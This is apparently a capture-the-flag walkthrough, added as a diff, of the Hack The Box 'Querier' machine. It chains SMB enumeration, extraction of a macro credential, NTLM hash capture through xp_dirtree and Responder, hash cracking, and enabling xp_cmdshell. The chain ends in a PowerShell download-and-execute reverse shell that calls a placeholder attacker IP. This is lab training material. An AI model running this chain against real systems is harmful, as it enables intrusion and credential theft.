@@ -1,0 +1,195 @@
+SMB + XLSM Decode + MSSQL + Responder Attack + NTLM Hash + Powershell reverse shell
+
+1-Enumeration:
+    nmap -T5 -Pn -sC -sV 10.10.10.125 -oN enum/scanLogs1.logs  -vv
+    PORT      STATE    SERVICE          REASON      VERSION
+    135/tcp   open     msrpc            syn-ack     Microsoft Windows RPC
+    139/tcp   open     netbios-ssn      syn-ack     Microsoft Windows netbios-ssn
+    445/tcp   open     microsoft-ds?    syn-ack
+    1051/tcp  filtered optima-vnet      no-response
+    1433/tcp  open     ms-sql-s         syn-ack     Microsoft SQL Server 2017 14.00.1000.00; RTM
+    | ms-sql-info: 
+    |   10.10.10.125:1433: 
+    |     Version: 
+    |       name: Microsoft SQL Server 2017 RTM
+    |       number: 14.00.1000.00
+    |       Product: Microsoft SQL Server 2017
+    |       Service pack level: RTM
+    |       Post-SP patches applied: false
+    |_    TCP port: 1433
+    | ms-sql-ntlm-info: 
+    |   10.10.10.125:1433: 
+    |     Target_Name: HTB
+    |     NetBIOS_Domain_Name: HTB
+    |     NetBIOS_Computer_Name: QUERIER
+    |     DNS_Domain_Name: HTB.LOCAL
+    |     DNS_Computer_Name: QUERIER.HTB.LOCAL
+    |     DNS_Tree_Name: HTB.LOCAL
+    |_    Product_Version: 10.0.17763
+
+    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+        Host script results:
+        | smb2-time: 
+        |   date: 2024-02-06T00:16:51
+        |_  start_date: N/A
+        |_clock-skew: mean: -15s, deviation: 0s, median: -15s
+        | smb2-security-mode: 
+        |   3:1:1: 
+        |_    Message signing enabled but not required
+        | p2p-conficker: 
+        |   Checking for Conficker.C or higher...
+        |   Check 1 (port 10624/tcp): CLEAN (Couldn't connect)
+        |   Check 2 (port 25203/tcp): CLEAN (Couldn't connect)
+        |   Check 3 (port 40571/udp): CLEAN (Timeout)
+        |   Check 4 (port 10812/udp): CLEAN (Failed to receive data)
+        |_  0/4 checks are positive: Host is CLEAN or ports are blocked
+
+
+
+    Enumeration SMB server:
+        smbclient -L //10.10.10.125/                 
+        Password for [WORKGROUP\kali]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Reports         Disk      
+
+
+        smbclient //10.10.10.125/Reports -U""
+        Password for [WORKGROUP\kali]:
+        Try "help" to get a list of possible commands.
+        smb: \> dir
+        .                                   D        0  Sun Feb  4 16:14:58 2024
+        ..                                  D        0  Sun Feb  4 16:14:58 2024
+        Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019
+        nc.exe                              A    59392  Sun Feb  4 16:15:01 2024
+
+        ###############################
+        smb:> get "Currency Volume Report.xlsm"
+
+        To analyze "xlsm" macro:
+            sudo pip install -U oletools
+            olevba 'Currency Volume Report.xlsm' 
+
+        We find a Hardcoded uID + password
+        ###############################
+
+        We check the permissions:
+            crackmapexec smb 10.10.10.125 -u'reporting' -p 'PcwTWTHRwryjc$c6' --shares -d Workgroup
+                SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:Workgroup) (signing:False) (SMBv1:False)
+                SMB         10.10.10.125    445    QUERIER          [+] Workgroup\reporting:PcwTWTHRwryjc$c6 
+                SMB         10.10.10.125    445    QUERIER          [+] Enumerated shares
+                SMB         10.10.10.125    445    QUERIER          Share           Permissions     Remark
+                SMB         10.10.10.125    445    QUERIER          -----           -----------     ------
+                SMB         10.10.10.125    445    QUERIER          ADMIN$                          Remote Admin
+                SMB         10.10.10.125    445    QUERIER          C$                              Default share
+                SMB         10.10.10.125    445    QUERIER          IPC$            READ            Remote IPC
+                SMB         10.10.10.125    445    QUERIER          Reports         READ            
+
+
+    Exploit MSSQL Server
+        We will test theses creds with MSSQL:
+            crackmapexec mssql -d Workgroup -u reporting -p PcwTWTHRwryjc$c6 -x 'whoami' ---- Doesnt work
+
+            /usr/bin/impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth ---- it works we have access
+            SQL (QUERIER\reporting  reporting@volume)>
+
+        to Enumerate MSSQL:
+            https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
+
+        We will get the NTLM Hash by using responder + smb server 
+
+            in Kali:
+                sudo responder -I <InterfaceName> -Pwd
+
+            in MSSQL shell:
+                because we are in 'master' table we will use:
+                    exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
+        
+        Now we can colect the NTLM Hash in responder:
+            SMB] NTLMv2-SSP Client   : 10.10.10.125
+            [SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
+            [SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:xxxxxxxxxxxx   
+
+        We use John for NTLMv2:
+            john NTLM.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+
+
+        We will test MSSQL connection with new creds:
+            /usr/bin/impacket-mssqlclient mssql-svc:'corporate568'@10.10.10.125 -windows-auth
+
+
+        Enumerate MSSQL again:
+            It works 
+            We will reconfigure xp_cmdshell:
+                # This turns on advanced options and is needed to configure xp_cmdshell
+                #One liner
+                    sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+                # Quickly check what the service account is via xp_cmdshell
+                    EXEC master..xp_cmdshell 'whoami'
+
+                # Get Rev shell
+                    EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://<KAli IP>:<Port>/rev2.ps1") | powershell -noprofile'
+
+            In Kali:
+                python3 -m http.server 
+                nc -lvnp 4443
+                rev2.ps1 (~/Desktop/Windows_PrivEsc/Exploit_payloads) <--- Reverse shell in Powershell
+                    Based on nishang github : https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+        
+        Windows Reverse shell:
+            whoami /all
+
+                USER INFORMATION
+                ----------------
+
+                User Name         SID                                           
+                ================= ==============================================
+                querier\mssql-svc S-1-5-21-3654930405-3667393904-3517260747-1001
+
+
+                GROUP INFORMATION
+                -----------------
+
+                Group Name                           Type             SID                                                             Attributes                                        
+                ==================================== ================ =============================================================== ==================================================
+                Everyone                             Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
+                BUILTIN\Users                        Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
+                BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558                                                    Mandatory group, Enabled by default, Enabled group
+                NT AUTHORITY\SERVICE                 Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
+                CONSOLE LOGON                        Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
+                NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
+                NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
+                NT AUTHORITY\Local account           Well-known group S-1-5-113                                                       Mandatory group, Enabled by default, Enabled group
+                NT SERVICE\MSSQLSERVER               Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner    
+                LOCAL                                Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
+                NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
+                Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                                                                      
+
+
+                PRIVILEGES INFORMATION
+                ----------------------
+
+                Privilege Name                Description                               State   
+                ============================= ========================================= ========
+                SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+                SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+                SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+                SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+                SeCreateGlobalPrivilege       Create global objects                     Enabled 
+                SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+            SeImpersonatePrivilege == enable == Potaote ???? 
+
+            systeminfo
+                windows server 2019 == Potatoe Patched...............    
+
+
+
